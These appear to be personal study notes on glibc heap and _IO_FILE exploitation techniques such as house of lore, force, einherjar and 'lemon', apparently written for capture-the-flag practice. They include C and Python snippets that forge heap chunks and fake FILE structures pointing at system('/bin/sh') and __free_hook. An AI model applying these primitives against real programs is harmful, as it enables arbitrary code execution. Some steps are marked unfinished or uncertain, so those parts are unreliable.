# bins

`large bin`: sort from large to small

## malloc

`(tcache ->) fast -> small -> unsorted -> large -> small/large again to find best fit -> top -> enlarge`

## free

`fastbin -> chunk from mmap(munmap) -> if prev/next free? consolidate and put to unsorted bin`

## smallbin attack/house of lore

`victim->bk = fake chunk`

`fake chunk->fd = victim`

## largebin attack

next size

## house of force

`XXX - top_chunk - 0x10`, prev size of top chunk will be on XXX

`XXX - top_chunk - 0x20`, next malloc will be on XXX

if XXX is 0x10 aligned

## house of einherjar

make a fake chunk

```c
fake_chunk[0] = 0; 
fake_chunk[1] = XXXXXX | 1; // size such that next chunk is victim chunk
fake_chunk[2] = (size_t) fake_chunk; // fwd
fake_chunk[3] = (size_t) fake_chunk; // bck
fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
```

overflow a using chunk, set `prev_inuse` in `size` field to 0, and set its `prev_size` such that the `prev_chunk` becomes our fake chunk

set the `size` of fake chunk such that the next chunk is the victim chunk

`size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); `

## malloc_hook

`0x50` one gadget can be satisfied by `malloc_printer`

# _IO_FILE

## fread/fwrite

will call `_io_xsgetn`

## fopen

will call `_IO_new_fopen`

## fclose

//call `_IO_finish`

### exploitation

todo: read source code of `_IO_new_fclose`

```python
#32 bits
fake_file = "/bin/sh\x00" + "\x00" * 0x40 + p32(fake_lock_addr)
fake_file = fake_file.ljust(0x94, "\x00")
fake_file += p32(fake_vtable_addr - 0x44)

#64 bits
fake_file = "/bin/sh\x00" + '\x00' * 0x8
fake_file += p64(system) + '\x00' * 0x70
# the system can also be placed in other memory
fake_file += p64(fake_lock_addr)
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr
```

`fake_lock_addr` must point to a memory containing all zero

## printf/puts

## house of lemon

`global_max_fast`

`free` large-size bin, can put the chunk into `stdout`, which locates just after `main_arena`

formula `malloc(0x10 + 0x10 * (offset_to_fastbin/8))`

## libc write 0 byte

write `_IO_buf_base` of `stdin`

so that we can control the structure of `stdin`, specifically, memory after `_IO_write_base`, if there is a `scanf`

then rewrite `_IO_buf_base` again by

```python
("0" * 0x16 + "1" + "\n" + p64(libc_addr + e.symbols["__free_hook"]) + p64(libc_addr + e.symbols["__free_hook"] + 8)) 
#"00001" for things like "%d" to let it give some value, 1 specifically
#rewrite _IO_buf_base again to __free_hook, and then we can write __free_hook in next scanf
#however, not clear to to write __free_hook specifically...
#there are some additional steps required...
#can do it by trial and error...
```

`IO_read_ptr > IO_read_end` 

## fread/fwrite

arbitrary memory read/write, need to modify some bits in `__IO_FILE` firstly

use house of lemon to rewrite data in heap